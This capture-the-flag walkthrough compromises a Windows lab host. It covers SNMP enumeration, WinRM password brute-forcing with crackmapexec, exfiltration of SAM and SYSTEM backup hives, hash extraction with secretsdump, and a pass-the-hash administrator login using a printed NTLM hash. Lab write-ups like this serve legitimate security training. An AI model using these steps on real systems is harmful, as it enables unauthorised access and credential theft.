# Year of the Owl

## Nmap

```
sudo nmap 10.10.140.97 -p- -sS -sV 

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

First up checking SMB shows we have no ability to authenticate with null credentials.

![](<../../../.gitbook/assets/image (1414).png>)

Port 80 root page takes us to index.php which is just a picture of an owl.

![](<../../../.gitbook/assets/image (1415).png>)

From here I ran Nikto and dirsearch.py and was unable to identify any other files or directories. I then ran extensive wordlists and extension suffixes and was still unable to identify anything.

Checking nmap against port 3306 shows we are now allowed to connect from our external host.

![](<../../../.gitbook/assets/image (1416).png>)

From here I tried a quick scan with Nmap against UDP ports top 10.

```
sudo nmap 10.10.140.97 -sUV --top-ports 10
```

![](<../../../.gitbook/assets/image (1417).png>)

Looking closely at the results we see a non default port is actually SNMP. Nmap was unable to enumerate version information. We can however, run a `onesixtyone` scan against it and see if we get a response.

```
onesixtyone 10.10.140.97 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 
```

![](<../../../.gitbook/assets/image (1418).png>)

`onesixtyone` has identified the community string 'openview'. We can then run this with snmp-check to dump all available SNMP information.

```
snmp-check -c openview 10.10.140.97
```

Looking through the results we find a non default username.

![](<../../../.gitbook/assets/image (1420).png>)

With WinRM open on port 5985 we can then bruteforce the user against the service. For this I used `crackmapexec`.

```
crackmapexec winrm 10.10.140.97 -u Jareth -p /usr/share/wordlists/rockyou.txt | grep '(Pwn3d!)'
```

![](<../../../.gitbook/assets/image (1421).png>)

We now have the credentials: `Jareth:sarah` From here we can log into WinRM with Evil-WinRM.

{% embed url="https://github.com/Hackplayers/evil-winrm" %}

Login with the following command:

```
evil-winrm -u jareth -p sarah -i 10.10.140.97 
```

![](<../../../.gitbook/assets/image (1422).png>)

At this point I got really stuck on how to proceed. Initially had issues runnign Winpeas as well until I used a Obfuscated binary linked below.

{% embed url="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases" %}

Even with this running I was unable to identify any key points for escalation. After going through some manual checklists I came across checking the Recycle bin as something that has not been done yet.

```
cd 'c:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
```

In which we can see sam.bak and system.bak.

![](<../../../.gitbook/assets/image (1423).png>)

To download these files onto the attacking machine we first need to move them out of the Recycle bin and elsewhere onto the system.

```
move .\system.bak c:\users\jareth\documents\system.bak
move .\sam.bak c:\users\jareth\documents\sam.bak
```

We can then download them.

```
download C:\users\jareth\documents\system.bak
download C:\users\jareth\documents\sam.bak
```

After these had downloaded to my attacking machine I ran samdump2 against the file which gave me incorrect hash values. After some troubleshooting I instead tried Impackets secretsdump.py to instead get the correct hash information.

```
sudo python2 secretsdump.py -sam /home/kali/sam -system /home/kali/system LOCAL 
```

![](<../../../.gitbook/assets/image (1424).png>)

From here I tried to crack the administrator password and was able to get a match. Instead I logged into WinRM with Evil-WinRM using the NTLM hash.

```
evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a -i 10.10.140.97
```

![](<../../../.gitbook/assets/image (1425) (1).png>)
